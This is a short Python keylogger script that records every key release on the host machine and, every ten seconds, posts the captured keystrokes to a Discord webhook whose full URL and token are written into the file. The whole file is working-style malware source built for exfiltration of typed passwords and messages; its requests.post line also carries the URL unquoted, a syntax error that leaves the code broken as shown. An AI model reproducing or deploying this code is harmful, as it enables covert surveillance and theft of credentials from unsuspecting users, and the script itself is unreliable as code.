import keyboard
import time
import requests
import threading

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1348479750871715920/WOjBfpX_SfFVEUY-5hJMUuh1vdO9JTgAv619sv2tk_yDzSPC_QuCBdL3vz3jmwF38WfE'

# Create a list to store the captured keystrokes
keylogs = []

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global keylogs

    # Check if there are any keylogs to send
    if keylogs:
        # Convert the keylogs to a string
        keylogs_str = '\n'.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        # Send the payload to the Discord webhook
        requests.post(https://discordapp.com/api/webhooks/1348479750871715920/WOjBfpX_SfFVEUY-5hJMUuh1vdO9JTgAv619sv2tk_yDzSPC_QuCBdL3vz3jmwF38WfE, data=payload)

        # Clear the keylogs list
        keylogs = []

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)

# Start capturing keystrokes
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

# Keep the script running
while True:
    time.sleep(1)
